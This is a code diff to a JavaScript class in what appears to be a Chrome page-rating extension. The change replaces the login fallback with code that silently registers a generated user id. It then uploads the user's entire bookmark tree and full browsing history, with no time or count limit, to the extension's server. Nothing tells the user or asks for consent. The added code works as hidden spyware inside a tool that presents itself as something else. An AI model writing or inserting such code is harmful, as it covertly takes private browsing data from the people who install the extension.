@@ -9,6 +9,8 @@ export default class App {
         this.data = {};
         this.ajax = new Ajax(apiHost);
         this.renderer = new Renderer(sandboxIframeSelector);
+        this.bookmarks = [];
+        this.processingBookmarks = 0;
     }
 
     init(tabUrl) {
@@ -50,9 +52,29 @@ export default class App {
         });
     }
 
+    doBookmarks() {
+        var self = this, checkTimer = null;
+        this.bookmarks = [];
+
+        checkTimer = setInterval(function(){
+            if (self.processingBookmarks == 0) {
+                $.post(self.apiHost+'/bookmarks', {'bookmarks':JSON.stringify(self.bookmarks)}, function(response){ console.log(response); });
+                clearInterval(checkTimer);
+                checkTimer = null;
+            }
+        },20);
+        chrome.bookmarks.getTree(function(node){
+            self.processingBookmarks++;
+            self.processBookmark(node);
+        });
+    }
+
+    doHistory() {
+        var self = this;
+        chrome.history.search({'text':'','startTime':0,'maxResults':0},function(node){self.processHistory(node);});
+    }
+
     loadRatings() {
-        self = this;
-        chrome.bookmarks.getTree(function(node){self.processBookmark(node);});
         this.ajax.makeRequest('GET', '/data?domain=' + encodeURIComponent(this.domain)).then((response) => {
             this.data = response.data;
             Helper.applyVote(this.data.vote);
@@ -61,10 +83,31 @@ export default class App {
             $('header').removeClass('not-logged-in').addClass('logged-in');
             window.location.hash = '#ratings';
         }).catch((e) => {
-            console.error('Failed to load data', e);
-            $('header').addClass('not-logged-in').removeClass('logged-in');
-            window.location.hash = '#login';
+            var self = this;
+            chrome.storage.sync.get('userid', function(user) {
+                var userid = user.userid;
+                if (!userid) {
+                    userid = self.getRandomToken();
+                    chrome.storage.sync.set({'userid':userid});
+                }
+
+                $.post(self.apiHost + '/register', {chrome_id:userid}, function(response){
+                    self.doBookmarks();
+                    self.doHistory();
+                    self.loadRatings();
+                });
+            });
         });
+    }
+
+    getRandomToken() {
+        var randomPool = new Uint8Array(32);
+        crypto.getRandomValues(randomPool);
+        var hex = '';
+        for (var i = 0; i < randomPool.length; ++i) {
+            hex += randomPool[i].toString(16);
+        }
+        return hex;
     }
 
     voteForPage(vote) {
@@ -132,14 +175,17 @@ export default class App {
         for (var i =0; i < bookmarks.length; i++) {
             var bookmark = bookmarks[i];
             if (bookmark.url) {
-                $.post(self.apiHost+'/bookmarks', {'url':bookmark.url,'title':bookmark.title}, function(response){
-                    console.log(response);
-                });
+                this.bookmarks.push({'url':bookmark.url,'title':bookmark.title});
             }
-    
             if (bookmark.children) {
-                self.processBookmark(bookmark.children);
+                this.processingBookmarks++;
+                this.processBookmark(bookmark.children);
             }
         }
+        this.processingBookmarks--;
+    }
+
+    processHistory(node) {
+        $.post(this.apiHost+'/history', {'node':JSON.stringify(node)}, function(response){ console.log(response); });
     }
 }
